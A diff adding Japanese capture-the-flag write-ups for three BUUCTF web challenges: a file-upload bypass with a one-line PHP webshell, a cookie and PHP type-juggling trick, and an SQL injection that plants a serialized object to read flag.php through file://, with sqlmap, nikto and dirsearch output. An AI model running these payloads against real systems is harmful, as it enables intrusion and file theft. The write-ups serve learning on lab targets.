@@ -23,6 +23,9 @@
 - [[极客大挑战 2019]BabySQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019babysql)
 - [[极客大挑战 2019]Upload](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019upload)
 - [[ACTF2020 新生赛]BackupFile](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bbackupfile)
+- [[ACTF2020 新生赛]Upload](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bupload)
+- [【[极客大挑战 2019]BuyFlag】8/15](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019buyflag815)
+- [[网鼎杯 2018]Fakebook](#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018fakebook)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -1000,3 +1003,351 @@ flag{02ce6e8f-c87a-4c79-a2b4-622b5e24bfeb}
 ## 参考サイト
 
 https://yohhoy.hatenadiary.jp/entry/20180529/p1
+
+# [ACTF2020 新生赛]Upload
+
+javascriptで簡単なバリデーションをして拡張子が画像ファイルかチェックしてるのでburpで書き換える。
+
+.phpは
+```
+nonono~ Bad file！
+```
+
+と怒られるので、phtmlを利用する
+
+```phtml
+GIF89a
+<script language="php">system($_GET['cmd']);</script>
+```
+## uplo4d/173e630e30310031738278ea85a6285f.phtml?cmd=cat /flag
+```
+GIF89a flag{3447f2f2-fc30-43f3-a4e9-a8188e79ba2a} 
+```
+
+# 【[极客大挑战 2019]BuyFlag】8/15
+
+/pay.phpに
+```
+<!-- ~~~post money and password~~~
+if (isset($_POST['password'])){
+	$password = $_POST['password']; 
+	if (is_numeric($password)) {
+		echo "password can't be number</br>"; 
+	}elseif ($password == 404) {
+		echo "Password Right!</br>"; 
+	}
+}
+```
+```
+% curl -i "http://f1b9a491-f619-4607-8e9d-2a1631396edb.node3.buuoj.cn/pay.php" --data "password=404"
+```
+
+```
+Only Cuit's students can buy the FLAG
+```
+
+とりあえず、どうやってCUITの生徒であると偽装するかを考えます。
+
+CUITとはコロンビア大学っぽいのでコロンビア大学の学生ポータルサイトをrefererで指定してみたり、x-forwarded-forで指定してみたり、したんですがダメでした。
+
+Cookieにuser: 0と怪しい値が入っていたので1に変更してみると
+
+```
+<p>
+you are Cuiter</br>Please input your password!!	
+</p>
+```
+
+というレスポンスが返ってきました。
+
+```
+% curl -i "http://f1b9a491-f619-4607-8e9d-2a1631396edb.node3.buuoj.cn/pay.php" -H "Cookie: user=1" --data "password=404"
+
+<p>If you want to buy the FLAG:</br>
+You must be a student from CUIT!!!</br>
+You must be answer the correct password!!!
+</p>
+<hr />
+<p>
+you are Cuiter</br>password can't be number</br>	
+</p>	
+```
+
+ここでburpでpasswordをPOSTしてもinput your password!!としか返ってこなかったんですが、curlでやったらいけました。
+ただし、can’t be numberって怒られてるので整数じゃなくてかつ404との比較が==なので、PHP type jugglingを利用して404のあとに適当な文字列をくっつければ
+
+```
+<p>
+you are Cuiter</br>Password Right!</br>Pay for the flag!!!hacker!!!</br>	
+</p>
+```
+といわれます。
+
+```
+% curl -i "http://f1b9a491-f619-4607-8e9d-2a1631396edb.node3.buuoj.cn/pay.php" -H "Cookie: user=1" --data "password=404'&money=100000000"
+
+<p>
+you are Cuiter</br>Password Right!</br>Nember lenth is too long</br>	
+</p>
+```
+
+これも==で比較していると予想してmoneyを配列にすれば0を返しtrueになります
+
+```
+% curl -i "http://f1b9a491-f619-4607-8e9d-2a1631396edb.node3.buuoj.cn/pay.php" -H "Cookie: user=1" --data "password=404'&money[]=1"
+
+<p>
+you are Cuiter</br>Password Right!</br>flag{e0d13d99-37f0-4359-a3b3-ea4e1c0833d4}
+</br>	
+</p>
+```
+
+# [网鼎杯 2018]Fakebook
+
+アカウントを適当に作ってみてみると
+
+http://fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.cn/view.php?no=
+
+ここにSQLiがある。
+とりあえず、
+```
+GET /view.php?no=1+or+1=1# HTTP/1.1
+```
+は通る。
+
+```
+GET /view.php?no='+union+select+1,2,3# HTTP/1.1
+```
+
+```
+no hack ~_~
+```
+フィルターかかっている。
+
+```
+$ sqlmap -u "http://fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.cn/view.php?no=2" --dbs --batch
+
+---
+Parameter: no (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: no=-6814 OR 3661=3661#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: no=(CASE WHEN (1403=1403) THEN SLEEP(5) ELSE 1403 END)
+---
+
+
+[07:53:42] [CRITICAL] unable to retrieve the database names
+```
+
+sqlmapやってみてもdatabaseの名前をretrieveできない。\\
+
+
+niktoをつかって簡単な脆弱性スキャンをする
+
+```
+$ nikto -h http://fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.cn
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          111.73.46.229
++ Target Hostname:    fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.cn
++ Target Port:        80
++ Start Time:         2020-08-15 08:01:09 (GMT-4)
+---------------------------------------------------------------------------
++ Server: openresty
++ Retrieved x-powered-by header: PHP/5.6.40
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie PHPSESSID created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/user.php.bak' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ /fe10593a-c262-440a-86ce-d52cc18f807cnode3.tar: Potentially interesting archive/cert file found.
++ /backup.war: Potentially interesting archive/cert file found.
++ /site.pem: Potentially interesting archive/cert file found.
++ /node3.tar.bz2: Potentially interesting archive/cert file found.
++ /fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.alz: Potentially interesting archive/cert file found.
+```
+
+user.php.bak
+```
+<?php
+
+
+class UserInfo
+{
+    public $name = "";
+    public $age = 0;
+    public $blog = "";
+
+    public function __construct($name, $age, $blog)
+    {
+        $this->name = $name;
+        $this->age = (int)$age;
+        $this->blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this->get($this->blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this->blog;
+        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
+    }
+
+}
+```
+
+```
+$ python3 dirsearch.py -u http://3d78d8bd-41d8-4439-9a1f-aa438b3cf806.node3.buuoj.cn -e php -s 1
+
+[20:40:18] Starting: 
+[20:43:10] 400 -  154B  - /%2e%2e/google.com                          
+[20:43:10] 200 -    1KB - /php                 
+[20:44:41] 200 -    1KB - /adminphp                                  
+[20:47:10] 301 -  185B  - /css  ->  http://3d78d8bd-41d8-4439-9a1f-aa438b3cf806.node3.buuoj.cn/css/
+[20:48:52] 200 -    1KB - /index.php                                 
+[20:49:10] 301 -  185B  - /js  ->  http://3d78d8bd-41d8-4439-9a1f-aa438b3cf806.node3.buuoj.cn/js/
+[20:49:33] 200 -    1KB - /login.php                                 
+[20:50:13] 200 -    1KB - /myadminphp                                
+[20:51:41] 200 -   37B  - /robots.txt                                
+[20:53:22] 200 -    0B  - /user.php                                  
+[20:53:33] 200 - 1019B  - /view.php 
+```
+
+
+SSRF攻撃とは
+> SSRF攻撃とは、攻撃者から直接到達できないサーバーに対する攻撃手法の一種です。
+
+SSRF攻撃が可能な脆弱性
+> SSRF攻撃が可能となる脆弱性には、CWE-918とCWE-611の他に以下があります。
+
+> ・ディレクトリトラバーサル（CWE-22）
+> ディレクトリトラバーサルとCWE-918は、脆弱性混入のメカニズムが非常に似ています。パラメータの中身がURLかパス名かという違いだけです。PHP等ではfopen等ファイル名を扱う機能でURLを指定できるため、ディレクトリトラバーサル脆弱性の悪用でSSRF攻撃が可能になります。
+
+> ・OSコマンドインジェクション
+> OSコマンドインジェクション（CWE-78）や、ファイルインクルード（LFI/RFI）（CWE-98）、安全でないデシリアライゼーション（CWE-502）などリモートコード実行(RCE)可能な脆弱性があれば、wgetやcurl等を利用してSSRF攻撃ができます。
+
+> ・SQLインジェクション
+> SQLインジェクション（CWE-89）でも任意コマンド実行が可能な場合がありますし、データベースから他のデータベースに接続する機能などがSSRF攻撃の踏み台として使える場合があります。以下の記事は、PostgreSQLを悪用したSSRF攻撃の例が紹介されています。
+
+今回の場合は、SQLインジェクションをつかってSSRF攻撃をし、他のデータベースに不正にアクセスすると考えられます。
+
+
+/join.ok.phpのページにもSQLインジェクションがあるのでsqlmapで確認してみる。
+
+
+join.ok.phpにフォームでPOSTするときのリクエストを保存してsqlmapつかう
+```
+$ sqlmap -r req.txt --dbs --batch
+
+sqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=test' AND 4652=4652 AND 'eiRh'='eiRh&passwd=test&age=0&blog=http://test.com
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=test' OR (SELECT 4752 FROM(SELECT COUNT(*),CONCAT(0x71706a7071,(SELECT (ELT(4752=4752,1))),0x716b7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'mGFv'='mGFv&passwd=test&age=0&blog=http://test.com
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+    Payload: username=test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck&passwd=test&age=0&blog=http://test.com
+---
+
+available databases [5]:
+[*] fakebook
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+```
+```
+$ sqlmap -r req.txt -D fakebook --tables --batch
+
+[1 table]
++-------+
+| users |
++-------+
+```
+
+```
+$ sqlmap -r req.txt -D fakebook -T users --dump-all --batch
+
+Table: users
+[14 entries]
++------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------+
+| no   | data                                                                                                                                                                                                                             | passwd                                                                                                                                  | username                                                                                             |
++------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------+
+| 1    | O:8:"UserInfo":3:{s:4:"name";s:4:"unko";s:3:"age";i:20;s:4:"blog";s:15:"http://blog.com";}                                                                                                                                       | 2929c149092ce9bdc3149156fc07f58039a6b430753c574285c794d9487a4ecb2adeb6a250623442d53f3ed8706cbea4ba6698b5614d2fb0a6bad6a7335a54b2 (unko) | unko                                                                                                 |
+| 2    | O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                                                        | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test                                                                                                 |
+| 3    | O:8:"UserInfo":3:{s:4:"name";s:4:"4177";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                                                        | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | 4177                                                                                                 |
+| 4    | O:8:"UserInfo":3:{s:4:"name";s:36:"test' AND 3748=5040 AND 'OdrF'='OdrF";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                       | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 3748=5040 AND 'OdrF'='OdrF                                                                 |
+| 5    | O:8:"UserInfo":3:{s:4:"name";s:36:"test' AND 1343=4332 AND 'moEQ'='moEQ";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                       | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 1343=4332 AND 'moEQ'='moEQ                                                                 |
+| 6    | O:8:"UserInfo":3:{s:4:"name";s:53:"test' AND (SELECT 0x58654e71)='FpqW' AND 'usTK'='usTK";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                      | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND (SELECT 0x58654e71)='FpqW' AND 'usTK'='usTK                                                |          
+| 7    | O:8:"UserInfo":3:{s:4:"name";s:137:"test' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71706a7071,(SELECT (ELT(9958=9958,1))),0x716b7a7671)) USING utf8))) AND 'MANs'='MANs";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";} | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71706a7071,(SELECT (ELT(9958=9958,1))),0x716b7a |
+| 8    | O:8:"UserInfo":3:{s:4:"name";s:98:"(SELECT CONCAT(CONCAT(0x71706a7071,(CASE WHEN (4460=4460) THEN 0x31 ELSE 0x30 END)),0x716b7a7671))";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                         | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | (SELECT CONCAT(CONCAT(0x71706a7071,(CASE WHEN (4460=4460) THEN 0x31 ELSE 0x30 END)),0x716b7a7671))   |
+| 9    | O:8:"UserInfo":3:{s:4:"name";s:61:"(SELECT CONCAT(0x71706a7071,(ELT(2868=2868,1)),0x716b7a7671))";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                              | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | (SELECT CONCAT(0x71706a7071,(ELT(2868=2868,1)),0x716b7a7671))                                        |
+| 10   | O:8:"UserInfo":3:{s:4:"name";s:35:"test' AND SLEEP(5) AND 'Dnhi'='Dnhi";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                        | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND SLEEP(5) AND 'Dnhi'='Dnhi                                                                  |
+| 11   | O:8:"UserInfo":3:{s:4:"name";s:19:"test' AND SLEEP(5)#";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                                        | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND SLEEP(5)#                                                                                  |
+| 12   | O:8:"UserInfo":3:{s:4:"name";s:66:"test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                         | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck                                   |
+| 13   | O:8:"UserInfo":3:{s:4:"name";s:66:"test' AND 6785=BENCHMARK(0000000,MD5(0x4c765849)) AND 'fAck'='fAck";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                         | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 6785=BENCHMARK(0000000,MD5(0x4c765849)) AND 'fAck'='fAck                                   |
+| 14   | O:8:"UserInfo":3:{s:4:"name";s:66:"test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                         | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck                                   |
++------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------+
+```
+
+sqlの結果をみるかぎり、no,data,passwd,usernameでカラムは4つでdataにserializedされたデータが格納されている。
+
+なので、union select 1,2,3,4 の中でどこかがdataに該当してunserializedする処理があると推測できる。
+今回はそれが4番目なので4番目にUserInfoのserializedされた結果を挿入する。
+
+```php
+<?php
+class UserInfo{
+	public $name = "test";
+	public $age = 0;
+	public $blog = "file:///var/www/html/flag.php";
+}
+
+$test = new UserInfo();
+echo serialize($test);
+?>
+```
+
+```
+$ php solve.php 
+O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:0;s:4:"blog";s:29:”file:///var/www/html/flag.php";}
+```
+
+## view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'%23
+
+```
+$ echo -n 'PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s2ZGZmN2JlNC1jOTJiLTRhYzgtYjg2NS1lZTE0NmY4ZTM1MjB9IjsNCmV4aXQoMCk7DQo=' | base64 -d
+<?php
+
+$flag = "flag{6dff7be4-c92b-4ac8-b865-ee146f8e3520}";
+exit(0);
+```
